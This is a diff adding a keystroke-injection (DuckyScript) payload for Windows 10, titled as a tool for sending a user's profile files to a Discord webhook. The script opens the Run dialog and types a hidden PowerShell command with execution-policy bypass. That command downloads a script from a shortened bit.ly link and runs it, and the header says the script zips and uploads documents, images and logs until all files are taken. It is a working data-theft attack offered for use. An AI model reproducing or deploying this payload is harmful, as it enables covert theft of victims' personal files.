@@ -1,0 +1,27 @@
+REM ###########################################################
+REM #                                                         #
+REM # Title        : Exfiltration files to discord.           #
+REM # Author       : Murdervan                                #
+REM # Link         : github.com/murdervan                     #
+REM # Target       : Windows 10                               #
+REM # Description  : This script compresses files from the    #
+REM #                user's profile folder (such as documents,#
+REM #                images, and log files) and sends them as #
+REM #                zip archives to a Discord webhook until  #
+REM #                all files are exfiltrated.               #
+REM #                                                         #
+REM ###########################################################
+
+
+
+
+
+REM Setup for script
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='YOUR_WEBHOOK_HERE'; irm bit.ly/4i82kAq | iex
+ENTER
